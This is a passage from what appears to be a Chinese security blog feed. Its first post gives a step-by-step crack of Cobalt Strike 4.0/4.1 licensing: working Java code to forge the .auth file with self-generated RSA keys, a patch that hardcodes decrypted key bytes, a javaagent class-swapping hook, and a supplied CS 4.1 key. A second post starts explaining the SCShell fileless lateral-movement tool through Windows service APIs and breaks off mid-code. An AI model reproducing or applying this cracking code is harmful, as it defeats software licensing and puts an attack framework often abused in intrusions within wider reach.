公私钥，然后使用私钥对文本内容进行加密，将公钥保存成  <code>authpub.key</code> ，并计算 MD5 值，对 <code>AuthCrypto.class</code> 中的 <code>8bb4df00c120881a1945a43e2bb2379e</code> 进行替换即可。这里的做法就是 <a href="https://mp.weixin.qq.com/s/Pneu8R0zoG0ONyFXF9VLpg" target="_blank" rel="noopener">Cobaltstrike 4破解之 我自己给我自己颁发license</a> 中的做法。</p><h5 id="4-1-1、-auth-文件组成"><a href="#4-1-1、-auth-文件组成" class="headerlink" title="4.1.1、.auth 文件组成"></a>4.1.1、.auth 文件组成</h5><p>由对 <code>Authorization()</code> 的分析过程可以得出文本内容应该由这些有效元素构成：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">将 .auth 文件读取成 byte[]，处理之后得出 <span class="number">26</span> 位的 byte[]，将其拆分为：</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>位 -&gt; 经过有符号转换 int，结果为<span class="number">29999999</span> -&gt; 用于判断是否永久有效（是否为发行版）</span><br><span class="line"><span class="number">4</span>位 -&gt; 经过有符号转换 int，结果不为 <span class="number">0</span> 即可 -&gt; 水印</span><br><span class="line"><span class="number">1</span>位 -&gt; 该 byte 值必须是大于 <span class="number">40</span> 且小于 <span class="number">128</span> -&gt; 判断认证是否适合 <span class="number">4.</span>x</span><br><span class="line"><span class="number">1</span>位 -&gt; 该 byte 值必须是 <span class="number">16</span> -&gt; <span class="type">key</span> 的长度</span><br><span class="line"><span class="number">16</span>位 -&gt; 该 <span class="type">key</span> 理论上无法逆推</span><br><span class="line"></span><br><span class="line">要注意的是：处理 .auth 文件的时候，还需要判断文件头...，因此还需要填充文件头，但按照分析下来，是 <span class="number">4</span> 个字节，但在实测过程中，发现是 <span class="number">6</span> 个字节</span><br><span class="line">因此 .auth 文件的必要数据是 <span class="number">32</span> 位 -&gt; <span class="number">6</span> + <span class="number">4</span> + <span class="number">4</span> + <span class="number">1</span> + <span class="number">1</span> + <span class="number">16</span></span><br></pre></td></tr></table></figure><p>因此我们只需要逆推 <code>DataParser</code> 中的 <code>readInt()</code>  就可以得到想要的内容。</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-08-01_14-03-22.png" alt=""></p><p>因此在解析 <code>.auth</code> 后返回的 <code>byte[]</code> 应该为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] decrypt = &#123; <span class="number">1</span>, -<span class="number">55</span>, -<span class="number">61</span>, <span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">34</span>, -<span class="number">112</span>, <span class="number">127</span>, <span class="number">16</span>, <span class="number">27</span>, -<span class="number">27</span>, -<span class="number">66</span>, <span class="number">82</span>, -<span class="number">58</span>, <span class="number">37</span>, <span class="number">92</span>, <span class="number">51</span>, <span class="number">85</span>, -<span class="number">114</span>, -<span class="number">118</span>, <span class="number">28</span>, -<span class="number">74</span>, <span class="number">103</span>, -<span class="number">53</span>, <span class="number">6</span> &#125;;</span><br></pre></td></tr></table></figure><p>代入测试：</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-08-01_14-08-26.png" alt=""></p><h5 id="4-1-2、生成-RSA-公钥、私钥及签名"><a href="#4-1-2、生成-RSA-公钥、私钥及签名" class="headerlink" title="4.1.2、生成 RSA 公钥、私钥及签名"></a>4.1.2、生成 RSA 公钥、私钥及签名</h5><p>该步骤，主要是生成 RSA 公私钥，然后使用私钥对上述生成的数据进行加密（注意，当你用私钥加密的时候，需要用公钥解密）后保存到 <code>cobaltstrike.auth</code>中。</p><p>你可以使用 <code>openssl</code> 生成，使用 2048 位即可，也可以使用代码生成，参考代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RSAKeyPairGenerator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PrivateKey privateKey;</span><br><span class="line">    <span class="keyword">private</span> PublicKey publicKey;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RSAKeyPairGenerator</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(<span class="string">"RSA"</span>);</span><br><span class="line">        keyGen.initialize(<span class="number">2048</span>);</span><br><span class="line">        KeyPair pair = keyGen.generateKeyPair();</span><br><span class="line">        <span class="keyword">this</span>.privateKey = pair.getPrivate();</span><br><span class="line">        <span class="keyword">this</span>.publicKey = pair.getPublic();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将byte 写入文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">byte2File</span><span class="params">(String path, <span class="keyword">byte</span>[] data)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(path);</span><br><span class="line">        f.getParentFile().mkdirs();</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(f);</span><br><span class="line">        fos.write(data);</span><br><span class="line">        fos.flush();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PrivateKey <span class="title">getPrivateKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> privateKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PublicKey <span class="title">getPublicKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> publicKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] encryptPri(<span class="keyword">byte</span>[] data, PrivateKey privateKey) <span class="keyword">throws</span> BadPaddingException, IllegalBlockSizeException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException &#123;</span><br><span class="line">        Cipher cipher = Cipher.getInstance(<span class="string">"RSA/ECB/PKCS1Padding"</span>);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, <span class="keyword">this</span>.privateKey);</span><br><span class="line">        <span class="keyword">return</span> cipher.doFinal(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, IOException, IllegalBlockSizeException, InvalidKeyException, NoSuchPaddingException, BadPaddingException </span>&#123;</span><br><span class="line">        RSAKeyPairGenerator PairGenerator = <span class="keyword">new</span> RSAKeyPairGenerator();</span><br><span class="line">        <span class="keyword">byte</span>[] data = &#123; -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">64</span>, -<span class="number">45</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">1</span>, -<span class="number">55</span>, -<span class="number">61</span>, <span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">34</span>, -<span class="number">112</span>, <span class="number">127</span>, <span class="number">16</span>, <span class="number">27</span>, -<span class="number">27</span>, -<span class="number">66</span>, <span class="number">82</span>, -<span class="number">58</span>, <span class="number">37</span>, <span class="number">92</span>, <span class="number">51</span>, <span class="number">85</span>, -<span class="number">114</span>, -<span class="number">118</span>, <span class="number">28</span>, -<span class="number">74</span>, <span class="number">103</span>, -<span class="number">53</span>, <span class="number">6</span> &#125;;</span><br><span class="line">        <span class="keyword">byte</span>[] rsaByte = PairGenerator.encryptPri(data, PairGenerator.getPrivateKey());</span><br><span class="line">        PairGenerator.byte2File(<span class="string">"RSA/cobaltstrike.auth"</span>, rsaByte);</span><br><span class="line">        PairGenerator.byte2File(<span class="string">"RSA/authkey.private"</span>, PairGenerator.getPrivateKey().getEncoded());</span><br><span class="line">        PairGenerator.byte2File(<span class="string">"RSA/authkey.pub"</span>, PairGenerator.getPublicKey().getEncoded());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功生成，剩下的就是替换相关文件，再更改 <code>AuthCrypto.load()</code> 中的 MD5 值。</p><h4 id="4-2、硬编码-key"><a href="#4-2、硬编码-key" class="headerlink" title="4.2、硬编码 key"></a>4.2、硬编码 key</h4><p>直接在 <code>Authorization()</code> 中注释掉以下代码行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] arrayOfByte2 = authCrypto.decrypt(arrayOfByte1);</span><br><span class="line">注释部分可以扩大到读取 cobaltstrike.auth 部分</span><br></pre></td></tr></table></figure><p>然后直接将解析后的 byte[] 进行写入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] arrayOfByte2 = &#123; <span class="number">1</span>, -<span class="number">55</span>, -<span class="number">61</span>, <span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">34</span>, -<span class="number">112</span>, <span class="number">127</span>, <span class="number">16</span>, <span class="number">27</span>, -<span class="number">27</span>, -<span class="number">66</span>, <span class="number">82</span>, -<span class="number">58</span>, <span class="number">37</span>, <span class="number">92</span>, <span class="number">51</span>, <span class="number">85</span>, -<span class="number">114</span>, -<span class="number">118</span>, <span class="number">28</span>, -<span class="number">74</span>, <span class="number">103</span>, -<span class="number">53</span>, <span class="number">6</span> &#125;;</span><br></pre></td></tr></table></figure><h4 id="4-3、CSHook-jar"><a href="#4-3、CSHook-jar" class="headerlink" title="4.3、CSHook.jar"></a>4.3、CSHook.jar</h4><p>以上两种方法都对 Jar 包进行修改，那我们再来看看不对源码进行修改的前提下进行 hook。Hook 的原理就是热替换，热替换的核心就在于 <code>Instrumentation</code> 的两个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// addTransformer() 用来注册类的修改器；</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="keyword">boolean</span> canRetransform)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// retransformClasses() 会让类重新加载，从而使得注册的类修改器能够重新修改类的字节码。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br></pre></td></tr></table></figure><p>这里主要是使用了 <code>addTransformer()</code>，其实原理很简单，就是将 4.2 中编译好的 <code>Authorization()</code> 类进行热替换，从而不去修改 jar 包的情况下完成认证。这部分知识可以参考：<a href="https://www.cnblogs.com/rickiyang/p/11368932.html" target="_blank" rel="noopener">javaagent使用指南</a></p><h5 id="4-3-1、读取-Authorization-class"><a href="#4-3-1、读取-Authorization-class" class="headerlink" title="4.3.1、读取 Authorization.class"></a>4.3.1、读取 Authorization.class</h5><p>首先先读取改写好的 <code>Authorization.class</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先读取 Authorization.class，byte[] 转 base64</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">toByteArray</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    File f = <span class="keyword">new</span> File(filename);</span><br><span class="line">    <span class="keyword">if</span> (!f.exists()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(filename);</span><br><span class="line">    &#125;</span><br><span class="line">    ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream((<span class="keyword">int</span>) f.length());</span><br><span class="line">    BufferedInputStream in = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        in = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(f));</span><br><span class="line">        <span class="keyword">int</span> buf_size = <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[buf_size];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (-<span class="number">1</span> != (len = in.read(buffer, <span class="number">0</span>, buf_size))) &#123;</span><br><span class="line">            bos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        String base64Str = Base64.getEncoder().encodeToString(bos.toByteArray());</span><br><span class="line">        System.out.println(base64Str);</span><br><span class="line">        <span class="comment">//return base64Str;</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        bos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再编写 <code>addTransformer()</code> 的调用类</p><h5 id="4-3-2、Transformer-类"><a href="#4-3-2、Transformer-类" class="headerlink" title="4.3.2、Transformer 类"></a>4.3.2、Transformer 类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Transformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">"common/Authorization"</span>)) &#123;</span><br><span class="line">            String base64class = <span class="string">"此处为 4.3.1 小节生成的内容"</span>;</span><br><span class="line">            System.out.println(<span class="string">"Found desired class: "</span> + className);</span><br><span class="line">            classfileBuffer = Base64.getDecoder().decode(base64class);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-3-3、premain"><a href="#4-3-3、premain" class="headerlink" title="4.3.3、premain"></a>4.3.3、premain</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CSHook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String paramString, Instrumentation paramInstrumentation)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hook start"</span>);</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> Transformer();</span><br><span class="line">        paramInstrumentation.addTransformer(transformer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：指定 <code>premain</code> 方法的位置，这里选择了修改 <code>META-INF/MANIFEST.MF</code> 的内容，将 <code>Main-Class</code> 修改成 <code>Premain-Class</code>。编译生成即可。</p><p><img src="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/blog_2020-08-01_17-52-18.png" alt=""></p><p>最后，这里提供 CS 4.1 的 key ： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] arrayOfByte2 = &#123; <span class="number">1</span>, -<span class="number">55</span>, -<span class="number">61</span>, <span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">34</span>, -<span class="number">112</span>, <span class="number">127</span>, <span class="number">16</span>, -<span class="number">128</span>, -<span class="number">29</span>, <span class="number">42</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">96</span>, -<span class="number">72</span>, -<span class="number">124</span>, <span class="number">65</span>, -<span class="number">101</span>, -<span class="number">96</span>, -<span class="number">63</span>, <span class="number">113</span>, -<span class="number">55</span>, -<span class="number">86</span>, <span class="number">118</span> &#125;;</span><br></pre></td></tr></table></figure><p>附件：<a href="/image/【知识回顾】Cobalt Strike 4.0认证及修补过程/CSHook_4.1.zip">CSHook_4.1.zip</a></p><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><ul><li>[1] <a href="https://www.cnblogs.com/pcheng/p/9629621.html" target="_blank" rel="noopener">RSA加密、解密、签名、验签的原理及方法</a></li><li>[2] <a href="https://blog.csdn.net/x_san3/article/details/80613605" target="_blank" rel="noopener">Java加密解密之MAC（消息认证码）</a></li><li>[3] <a href="https://www.sdnlab.com/21145.html" target="_blank" rel="noopener">暴力解决一切？破解AES也是妄想！</a></li><li>[4] <a href="https://blog.gzsec.org/post/Patch-Cobalt-Strike-4.0/" target="_blank" rel="noopener">Patch Cobalt Strike 4.0</a></li><li>[5] <a href="https://ca3tie1.github.io/post/cobaltstrike40-wu-hook-man-li-cracked-license-si-lu/" target="_blank" rel="noopener">CobaltStrike4.0无Hook蛮力Cracked License思路</a></li><li>[6] <a href="https://mp.weixin.qq.com/s/Pneu8R0zoG0ONyFXF9VLpg" target="_blank" rel="noopener">Cobaltstrike 4破解之 我自己给我自己颁发license</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;font color=&quot;red&quot;&gt;想要理解整个认证过程，必须要动手走一轮代码。&lt;/font&gt;
&lt;/li&gt;
&lt;li&gt;&lt;font color=&quot;#008000&quot;&gt;想要理解整个认证过程，必须要动手走一轮代码。&lt;/font&gt;
&lt;/li&gt;
&lt;li&gt;&lt;font color=&quot;Blue&quot;&gt;想要理解整个认证过程，必须要动手走一轮代码。&lt;/font&gt;
&lt;/li&gt;
&lt;li&gt;&lt;font face=&quot;STCAIYUN&quot;&gt;想要理解整个认证过程，必须要动手走一轮代码。&lt;/font&gt;
&lt;/li&gt;
&lt;li&gt;&lt;font face=&quot;微软雅黑&quot;&gt;想要理解整个认证过程，必须要动手走一轮代码。&lt;/font&gt;
&lt;/li&gt;
&lt;li&gt;&lt;font face=&quot;黑体&quot;&gt;想要理解整个认证过程，必须要动手走一轮代码。&lt;/font&gt;

&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【渗透技巧】SCshell 技术细节</title>
    <link href="https://rcoil.me/2019/12/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91SCshell%20%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/"/>
    <id>https://rcoil.me/2019/12/【渗透技巧】SCshell 技术细节/</id>
    <published>2019-12-12T06:37:56.000Z</published>
    <updated>2019-12-20T02:06:07.734Z</updated>
    
    <content type="html"><![CDATA[<p>估计最近一段时间不再更新 blog，要更新的话也是对之前的文章修修补补。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><code>SCShell</code> 是一款无文件横向移动的工具，主要依赖于 <code>ChangeServiceConfigA</code> 函数，用于修改 Windows 服务的配置。该工具的优点在于它不会通过 <code>SMB</code> 协议去执行身份验证。该工具是通过 <code>DCE/RPC</code> 协议进行的。</p><p>因为是远程修改服务进行的，所以它不需要注册或创建服务。也不会删除远程系统上的任何文件。</p><p>与直接使用 <code>sc.exe</code> 的差别在于：<strong><em>如果当前进程无远程主机的权限，则需要使用 <code>SMB</code> 协议进行身份验证，后续步骤两者相同</em></strong>。</p><h2 id="0x01-函数-API-介绍"><a href="#0x01-函数-API-介绍" class="headerlink" title="0x01 函数 API 介绍"></a>0x01 函数 API 介绍</h2><h3 id="1-1、LogonUserA"><a href="#1-1、LogonUserA" class="headerlink" title="1.1、LogonUserA"></a>1.1、LogonUserA</h3><p>该函数是使用用户和明文密码登陆到本地计算机，无法登陆远程计算机。如果函数成功，则会受到表示已登陆用户的令牌的句柄，然后可以使用此令牌句柄模拟指定用户。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">LogonUserA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpszUsername,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpszDomain,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpszPassword,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwLogonType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwLogonProvider,</span></span></span><br><span class="line"><span class="function"><span class="params">  PHANDLE phToken</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong><em>lpszUsername：</em></strong>指向以空字符结尾的字符串的指针，该字符串指定用户的名称，也就是要登陆的用户账号。</p></li><li><p><strong><em>lpszDomain：</em></strong>指向以空字符结尾的字符串的指针，该字符串指定该账户的域或服务器的名称。如果此参数为 NULL，则必须以 UPN 格式指定用户名。如果此参数为 “.”，则表示使用本地账户来验证。</p></li><li><p><strong><em>lpszPassword：</em></strong>指向以空字符结尾的字符串的指针，该字符串指向 <em>lpszUsername</em> 中指定用户的明文密码。结束使用后，可调用 <a href="https://docs.microsoft.com/previous-versions/windows/desktop/legacy/aa366877(v=vs.85" target="_blank" rel="noopener">SecureZeroMemory</a>) 函数以清除内存中的密码。</p></li><li><p><strong><em>dwLogonType：</em></strong>要执行的登陆操作的类型，共计 7 个类型。此处使用 <code>LOGON32_LOGON_NEW_CREDENTIALS</code>，该登陆类型允许调用方克隆其当前令牌，并为出站连接指定新的凭据。新的登陆会话具有相同的本地标识符，但对其他网络连接使用不同的凭据。</p></li><li><p><strong><em>dwLogonProvider：</em></strong>指定登陆提供程序，共计 3 个值。此处使用系统标准登陆提供程序：<code>LOGON32_PROVIDER_DEFAULT</code></p></li><li><p><strong><em>phToken：</em></strong>指向句柄变量的指针，该变量接收代码指定用户的令牌的句柄。</p></li><li><p><strong><em>返回值：</em></strong>非零值</p></li></ul><h3 id="1-2、ImpersonateLoggedOnUserA"><a href="#1-2、ImpersonateLoggedOnUserA" class="headerlink" title="1.2、ImpersonateLoggedOnUserA"></a>1.2、ImpersonateLoggedOnUserA</h3><p>与 <code>LogonUserA</code> 函数相呼应。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ImpersonateLoggedOnUser</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hToken</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><strong><em>hToken：</em></strong>代表已登陆用户的主或模拟 Access token 的句柄。</li></ul><ul><li><strong><em>返回值：</em></strong>非零值</li></ul><h3 id="1-3、OpenSCManagerA"><a href="#1-3、OpenSCManagerA" class="headerlink" title="1.3、OpenSCManagerA"></a>1.3、OpenSCManagerA</h3><p>建立到指定计算机上的服务控制管理器的连接，并打开指定的服务控制管理器数据库。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SC_HANDLE <span class="title">OpenSCManagerA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpMachineName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpDatabaseName,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwDesiredAccess</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><strong><em>lpMachineName：</em></strong> 目标计算机名称，如果指针为 NULL或指向空字符串，则该函数将连接本地计算机上的服务控制管理器。</li><li><strong><em>lpDatabaseName：</em></strong>服务控制管理器数据库的名称。默认情况下此参数应设置为 <code>SERVICES_ACTIVE_DATABASE</code>。</li><li><strong><em>dwDesiredAccess：</em></strong>对服务控制管理器的访问。此处应为 <code>SC_MANAGER_ALL_ACCESS</code>，囊括了列表中的所有权限。有关访问权限列表可参阅【<a href="https://docs.microsoft.com/zh-cn/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noopener">服务安全和访问权限</a>】</li><li><strong><em>返回值：</em></strong> 返回指定服务控制管理器数据库的句柄。</li></ul><h3 id="1-4、OpenServiceA"><a href="#1-4、OpenServiceA" class="headerlink" title="1.4、OpenServiceA"></a>1.4、OpenServiceA</h3><p>通过服务控制管理器打开现有服务。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SC_HANDLE <span class="title">OpenServiceA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE hSCManager,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpServiceName,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwDesiredAccess</span></span></span><br><span class="line"><span class="function"><span 